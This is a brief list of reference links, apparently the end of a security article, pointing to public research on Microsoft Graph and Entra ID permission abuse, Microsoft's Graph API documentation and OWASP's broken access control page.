- **SpecterOps RBAC Analysis:** https://posts.specterops.io/directory-readwrite-all-is-not-as-powerful-as-you-might-think-c5b09a8f78a8
- **Semperis Graph Exploitation:** https://www.semperis.com/blog/exploiting-app-only-graph-permissions-in-entra-id/
- **Microsoft Graph API Documentation:** https://learn.microsoft.com/en-us/graph/
- **OWASP Broken Access Control:** https://owasp.org/Top10/A01_2021-Broken_Access_Control/

---